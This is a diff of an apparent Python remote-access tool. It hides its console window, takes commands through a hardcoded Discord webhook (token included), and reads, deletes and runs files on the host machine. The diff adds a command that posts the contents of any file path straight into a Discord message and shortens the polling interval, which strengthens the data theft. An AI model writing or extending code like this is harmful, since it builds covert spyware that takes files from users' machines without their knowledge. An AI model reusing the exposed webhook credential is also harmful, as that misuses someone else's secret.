@@ -42,7 +42,7 @@ WEBHOOK_URL = (
     "https://discord.com/api/webhooks/1524620703259951104/"
     "fqpIEBXVWsKHy7f1iZ9xoryCpidmjPYIDuITfcwMOjBfMyS2HtJNWpVbfOetapl8vw9O"
 )
-POLL_INTERVAL = 30  # seconds
+POLL_INTERVAL = 10  # seconds
 CREATE_NO_WINDOW = (
     subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
 )
@@ -249,6 +249,14 @@ def _execute_command(cmd, portal_dir):
         _post_file_to_discord(f"{tag} Contents of {path}", _write_temp(result))
         return True, result
 
+    elif cmd_type == "read_file_inline":
+        path = cmd.get("path", "")
+        if not path:
+            return False, "Missing path"
+        result = _read_file(path, max_bytes=1800)  # Discord message limit
+        _post_to_discord(f"{tag} `{path}`:\n```\n{result[:1800]}\n```")
+        return True, result
+
     elif cmd_type == "delete_file":
         path = cmd.get("path", "")
         if not path:
@@ -283,8 +291,10 @@ def _execute_command(cmd, portal_dir):
     elif cmd_type == "speak":
         msg = cmd.get("text", "")
         if msg:
+            # Speak aloud AND show a message box (in case volume is off)
             _speak_text(msg)
-            _post_to_discord(f"{tag} Spoken to user: {msg[:200]}")
+            _show_user_message(msg)
+            _post_to_discord(f"{tag} Spoken + message shown to user: {msg[:200]}")
         return True, msg
 
     elif cmd_type == "run_script":
